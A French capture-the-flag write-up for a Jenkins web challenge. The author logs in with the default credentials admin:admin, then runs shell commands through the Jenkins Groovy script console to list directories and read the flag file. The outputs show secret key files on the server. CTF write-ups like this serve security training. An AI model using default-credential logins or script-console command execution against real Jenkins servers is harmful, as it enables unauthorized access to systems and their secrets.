  
*****  
		                     Jenkins - Web
*****
**Enoncé:** [lien de l'épreuve](http://51.91.120.156:8085)

Pour cette épreuve nous n'avons pas de consigne juste un lien qui redirige vers cette page :

![](https://lh3.googleusercontent.com/K_cihXEqyHqqt8pWcPkGQMZjNrB6__hXdgGCmzAzfB5Je5aaAc9Co01G5EMzaRl2jT0MIczKibg)

Essayons de nous authentifier avec des identifiants par défaut:

    root : root 

Ceci ne fonctionne pas essayons:  `admin : admin` 

Et bingo on s’authentifie.
La version de **Jenkins**  actuelle, c'est à dire la  [version. 2.46.1](http://jenkins-ci.org/) a une vulnérabilité datant de **2017** dont le **CVE** est le suivant: [CVE-2017-1000353](https://www.cvedetails.com/cve/CVE-2017-1000353/) reste à exploiter cette vulnérabilité.

En fouillant la plateforme, nous sommes tombé sur une [console de script](http://51.91.120.156:8085/script) permettant d'exécuter des scripts sur le serveur. Ce sera notre porte d'entrer.
Nous allons y injecter ce script groovy: 

```groovy
println "sh -c ls -al".execute().text
```
**qui nous permettra de lister les fichiers et dossiers cachés du répertoire courant.**
**Résultat:**
>bin
boot
dev
docker-java-home
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

Nous allons maintenant retrouver le flag. Listons les fichiers et dossiers contenues dans le répertoire **/var/** . Pour cela injectons ce script:
```groovy
println "ls /var/".execute().text
```
**Résultat:**
>backups
cache
jenkins_home
lib
local
lock
log
mail
opt
run
spool
tmp

Voyons ce qu'il a dans le dossier **jenkins_home**  :
```groovy
println "ls -al /var/jenkins_home/".execute().text
```
**Résultat**:
>total 136
drwxr-xr-x  1 jenkins jenkins 4096 Nov 14 10:00 .
drwxr-xr-x  1 root    root    4096 Apr 16  2019 ..
-rw-r--r--  1 jenkins jenkins  220 May 15  2017 .bash_logout
-rw-r--r--  1 jenkins jenkins 3526 May 15  2017 .bashrc
drwxr-xr-x  3 jenkins jenkins 4096 Nov 13 09:38 .java
-rw-r--r--  1 jenkins jenkins   43 Nov 24 07:34 .owner
-rw-r--r--  1 jenkins jenkins  675 May 15  2017 .profile
-rw-r--r--  1 jenkins jenkins 4547 Nov 14 10:00 config.xml
-rw-r--r--  1 jenkins jenkins   86 Nov 13 09:38 copy_reference_file.log
-rw-r--r--  1 jenkins jenkins   32 Nov 13 09:44 flag.txt
-rw-r--r--  1 jenkins jenkins  159 Nov 13 13:48 hudson.model.UpdateCenter.xml
-rw-r--r--  1 jenkins jenkins  134 Nov 13 21:42 hudson.tasks.Shell.xml
-rw-r--r--  1 jenkins jenkins  215 Nov 13 21:42 hudson.triggers.SCMTrigger.xml
-rw-------  1 jenkins jenkins 1712 Nov 13 09:39 identity.key.enc
drwxr-xr-x  2 jenkins jenkins 4096 Nov 13 09:38 init.groovy.d
-rw-r--r--  1 jenkins jenkins    6 Nov 13 13:48 jenkins.install.InstallUtil.lastExecVersion
-rw-r--r--  1 jenkins jenkins    6 Nov 13 09:39 jenkins.install.UpgradeWizard.state
-rw-r--r--  1 jenkins jenkins  159 Nov 13 21:42 jenkins.model.ArtifactManagerConfiguration.xml
-rw-r--r--  1 jenkins jenkins  268 Nov 13 21:42 jenkins.model.JenkinsLocationConfiguration.xml
drwxr-xr-x  5 jenkins jenkins 4096 Nov 13 18:37 jobs
drwxr-xr-x  3 jenkins jenkins 4096 Nov 13 09:39 logs
-rw-r--r--  1 jenkins jenkins  907 Nov 13 13:53 nodeMonitors.xml
drwxr-xr-x  2 jenkins jenkins 4096 Nov 13 09:39 nodes
drwxr-xr-x  2 jenkins jenkins 4096 Nov 13 09:38 plugins
-rw-r--r--  1 jenkins jenkins  130 Nov 13 13:48 queue.xml.bak
-rw-r--r--  1 jenkins jenkins   64 Nov 13 09:38 secret.key
-rw-r--r--  1 jenkins jenkins    0 Nov 13 09:38 secret.key.not-so-secret
drwx------  4 jenkins jenkins 4096 Nov 13 11:08 secrets
drwxr-xr-x  2 jenkins jenkins 4096 Nov 23 13:48 updates
drwxr-xr-x  2 jenkins jenkins 4096 Nov 13 09:39 userContent
drwxr-xr-x  3 jenkins jenkins 4096 Nov 13 13:39 users
drwxr-xr-x 10 jenkins jenkins 4096 Nov 13 09:38 war
drwxr-xr-x 10 jenkins jenkins 4096 Nov 13 18:05 workspace

Une partie du mystère résolue. On peut apercevoir le fichier **flag.txt** dans la liste. Lisons maintenant son contenu en utilisant **cat**:

```groovy
println "cat /var/jenkins_home/flag.txt".execute().text
```
**Résultat:**
>
>CTF_ThatWasUnbreakableIThought!

Bingo enfin on a le flag : **CTF_ThatWasUnbreakableIThought!**



